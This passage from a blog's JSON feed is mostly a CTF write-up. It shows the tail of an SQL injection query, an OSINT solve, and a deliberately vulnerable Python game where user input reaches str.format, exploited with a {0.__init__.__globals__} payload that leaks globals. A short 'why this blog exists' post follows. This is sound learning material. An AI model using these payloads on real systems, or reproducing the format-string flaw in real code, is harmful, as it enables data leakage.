class=\"n\">ZGVmaW5pdGVseS1ub3QtZmxhZw</span> <span class=\"k\">FROM</span> <span class=\"n\">c2VjcmV0LWRi</span> <span class=\"k\">WHERE</span> <span class=\"s1\">'x'</span> <span class=\"o\">=</span> <span class=\"s1\">'x'</span></code></pre></div></div><p>The flag <code class=\"language-plaintext highlighter-rouge\">BtS-CTF{7h475_h0w_y0u_ch347_1n_94m35}</code> was only thing in table <code class=\"language-plaintext highlighter-rouge\">c2VjcmV0LWRi</code>.</p><hr /><h3 id=\"3-osint-challenge---lost-photos\">3. OSINT challenge - Lost Photos</h3><blockquote>  <p>God! All my photos from Moscow are gone, Hard disk had some problems, Usually it happens to my friends, Not to me, Thomas Garminas will be so upset.PS.: When you find what you are looking for, just put it between curly brackets and win this challenge</p></blockquote><p><img src=\"/assets/img/lost-photos.png\" alt=\"Google Thomas Garminas\" /><img src=\"/assets/img/lost-photos-1.png\" alt=\"Thomas Garminas - Youtube channel\" />Submitting <code class=\"language-plaintext highlighter-rouge\">BtS-CTF{02.12.2017}</code> failed. I was afraid that the flag might be in this silent video.</p><p><img src=\"/assets/img/lost-photos-2.png\" alt=\"Google Thomas Garminas - Firefox\" /><img src=\"/assets/img/lost-photos-3.png\" alt=\"Google concert 02.12.2017 - Firefox\" />By luck, Firefox saved the day. Chrome was not showing the hint. <code class=\"language-plaintext highlighter-rouge\">BtS-CTF{Amaranthe}</code> - accepted.</p><hr /><h3 id=\"4-misc-challenge---simple-game-calculator\">4. Misc challenge - Simple game calculator</h3><p>A simple python game source code was exposed via the debug option.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">import</span> <span class=\"nn\">os</span><span class=\"p\">,</span> <span class=\"n\">sys</span><span class=\"k\">class</span> <span class=\"nc\">Multiplayer</span><span class=\"p\">(</span><span class=\"nb\">object</span><span class=\"p\">):</span>    <span class=\"k\">def</span> <span class=\"nf\">__init__</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">,</span> <span class=\"n\">name</span><span class=\"p\">,</span> <span class=\"n\">difficulty</span><span class=\"p\">,</span> <span class=\"n\">players</span><span class=\"p\">):</span>        <span class=\"bp\">self</span><span class=\"p\">.</span><span class=\"n\">name</span> <span class=\"o\">=</span> <span class=\"n\">name</span>        <span class=\"bp\">self</span><span class=\"p\">.</span><span class=\"n\">difficulty</span> <span class=\"o\">=</span> <span class=\"s\">\"easy\"</span> <span class=\"c1\"># No one will create hard game, no need to implement it</span>        <span class=\"bp\">self</span><span class=\"p\">.</span><span class=\"n\">players</span> <span class=\"o\">=</span> <span class=\"n\">players</span>    <span class=\"k\">def</span> <span class=\"nf\">show_details</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>        <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">'{0.players} can play this easy game called'</span> <span class=\"o\">+</span> <span class=\"bp\">self</span><span class=\"p\">.</span><span class=\"n\">name</span><span class=\"p\">).</span><span class=\"nb\">format</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">)</span><span class=\"k\">class</span> <span class=\"nc\">CTFGame</span><span class=\"p\">(</span><span class=\"nb\">object</span><span class=\"p\">):</span>    <span class=\"k\">def</span> <span class=\"nf\">__init__</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>        <span class=\"bp\">self</span><span class=\"p\">.</span><span class=\"n\">flag</span> <span class=\"o\">=</span> <span class=\"s\">\"asd\"</span><span class=\"n\">games</span> <span class=\"o\">=</span> <span class=\"p\">{</span>    <span class=\"s\">'multi'</span><span class=\"p\">:</span> <span class=\"nb\">list</span><span class=\"p\">()</span><span class=\"p\">}</span><span class=\"k\">def</span> <span class=\"nf\">user_choice</span><span class=\"p\">():</span>    <span class=\"n\">menu</span> <span class=\"o\">=</span> <span class=\"s\">\"\"\"    Welcome to Simple Game Creator where you can create your game of choice!    1. View all games    2. Create your own multiplayer game    \"\"\"</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">menu</span><span class=\"p\">)</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"s\">\"Choose wisely &gt;&gt; \"</span><span class=\"p\">)</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">flush</span><span class=\"p\">()</span>    <span class=\"k\">return</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdin</span><span class=\"p\">.</span><span class=\"n\">readline</span><span class=\"p\">()</span><span class=\"k\">def</span> <span class=\"nf\">add_multi</span><span class=\"p\">():</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"s\">\"Name your own multiplayer game &gt;&gt; \"</span><span class=\"p\">)</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">flush</span><span class=\"p\">()</span>    <span class=\"n\">name</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdin</span><span class=\"p\">.</span><span class=\"n\">readline</span><span class=\"p\">().</span><span class=\"n\">strip</span><span class=\"p\">()</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"s\">\"What difficulty will it have (hard, easy)? &gt;&gt; \"</span><span class=\"p\">)</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">flush</span><span class=\"p\">()</span>    <span class=\"n\">diff</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdin</span><span class=\"p\">.</span><span class=\"n\">readline</span><span class=\"p\">().</span><span class=\"n\">strip</span><span class=\"p\">()</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"s\">\"How many players can play this? &gt;&gt; \"</span><span class=\"p\">)</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">flush</span><span class=\"p\">()</span>    <span class=\"n\">players</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdin</span><span class=\"p\">.</span><span class=\"n\">readline</span><span class=\"p\">().</span><span class=\"n\">strip</span><span class=\"p\">()</span>    <span class=\"n\">games</span><span class=\"p\">[</span><span class=\"s\">'multi'</span><span class=\"p\">].</span><span class=\"n\">append</span><span class=\"p\">(</span><span class=\"n\">Multiplayer</span><span class=\"p\">(</span><span class=\"n\">name</span><span class=\"p\">,</span> <span class=\"n\">diff</span><span class=\"p\">,</span> <span class=\"n\">players</span><span class=\"p\">))</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">\"You created your own multiplayer game\"</span><span class=\"p\">)</span><span class=\"k\">def</span> <span class=\"nf\">show_games</span><span class=\"p\">():</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">Your games: \"</span><span class=\"p\">)</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">Multiplayers: \"</span><span class=\"p\">)</span>    <span class=\"k\">for</span> <span class=\"n\">multi</span> <span class=\"ow\">in</span> <span class=\"n\">games</span><span class=\"p\">[</span><span class=\"s\">'multi'</span><span class=\"p\">]:</span>        <span class=\"n\">multi</span><span class=\"p\">.</span><span class=\"n\">show_details</span><span class=\"p\">()</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">\"\"</span><span class=\"p\">)</span><span class=\"k\">def</span> <span class=\"nf\">main</span><span class=\"p\">():</span>    <span class=\"n\">banner</span> <span class=\"o\">=</span> <span class=\"s\">\"\"\"Banner\"\"\"</span>    <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>        <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">banner</span><span class=\"p\">)</span>        <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">flush</span><span class=\"p\">()</span>        <span class=\"n\">choice</span> <span class=\"o\">=</span> <span class=\"n\">user_choice</span><span class=\"p\">().</span><span class=\"n\">strip</span><span class=\"p\">()</span>        <span class=\"n\">choices</span> <span class=\"o\">=</span> <span class=\"p\">{</span>            <span class=\"s\">'1'</span><span class=\"p\">:</span> <span class=\"n\">show_games</span><span class=\"p\">,</span>            <span class=\"s\">'2'</span><span class=\"p\">:</span> <span class=\"n\">add_multi</span>        <span class=\"p\">}</span>        <span class=\"n\">ans</span> <span class=\"o\">=</span> <span class=\"n\">choices</span><span class=\"p\">.</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"n\">choice</span><span class=\"p\">,</span> <span class=\"bp\">None</span><span class=\"p\">)</span>        <span class=\"k\">if</span> <span class=\"ow\">not</span> <span class=\"n\">ans</span><span class=\"p\">:</span>            <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">\"There is no such option mate\"</span><span class=\"p\">)</span>        <span class=\"k\">else</span><span class=\"p\">:</span>            <span class=\"n\">ans</span><span class=\"p\">()</span><span class=\"k\">if</span> <span class=\"n\">__name__</span> <span class=\"o\">==</span> <span class=\"s\">\"__main__\"</span><span class=\"p\">:</span>    <span class=\"n\">main</span><span class=\"p\">()</span></code></pre></div></div><p>Several years ago, I read an article about the format string vulnerability in C code. Until today, I never imagined the concept can be applied to python as well. The only thing fishy in the code was the print statement with formatting. Google: “format string vulnerability python” yielded this <a href=\"https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/\">GeeksForGeeks</a> article. I was able to manage to come up with  <code class=\"language-plaintext highlighter-rouge\">{0.__init__.__globals__}</code> to read the flag in the game. Anyway, these were all the challenges that I successfully solved during the live event. Event ended about an hour ago, organizers have already published everything to this git <a href=\"https://github.com/PWrWhiteHats/BtS-CTF-Challenges-03-2021\">repository</a>.</p><p>Thanks to those who organized and sponsored the event. It was a really fun experience for me after all.</p>",
            "url": "mediocreone.com/2021/03/14/break-the-syntax",
            
            
            
            "tags": ["CTF","XSS","format string","SQL injection"],
            
            "date_published": "2021-03-14T00:00:00+00:00",
            "date_modified": "2021-03-14T00:00:00+00:00",
            
                "author":  {
                "name": "mediocre_one",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "mediocreone.com/2020/10/15/why-this-blog-exists",
            "title": "Why this blog exists?",
            "summary": "Reason for blogging",
            "content_text": "Well, some of my today’s work has inspired by Lucas Kostka.  Purchase a cheap domain  Find a blog theme - All the credit goes to Ronalds Vilciņš  Google “reason for blogging” - landed on this long post which I am not likely to read through  Write this first mumbo jumbo  Put it up on the internet as fast as I could",
            "content_html": "<p>Well, some of my today’s work has inspired by <a href=\"https://fuckyousunday.com\">Lucas Kostka</a>.</p><ul>  <li>Purchase a cheap domain</li>  <li>Find a blog theme - All the credit goes to <a href=\"https://github.com/ronv/sidey\">Ronalds Vilciņš</a></li>  <li>Google “reason for blogging” - landed on <a href=\"https://bloggingwizard.com/reasons-to-start-a-blog\">this long post</a> which I am not likely to read through</li>  <li>Write this first mumbo jumbo</li>  <li>Put it up on the internet as fast as I could</li></ul>",
            "url": "mediocreone.com/2020/10/15/why-this-blog-exists",
            
            
            
            
            
            "date_published": "2020-10-15T00:00:00+00:00",
            "date_modified": "2020-10-15T00:00:00+00:00",
            
                "author":  {
                "name": "mediocre_one",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}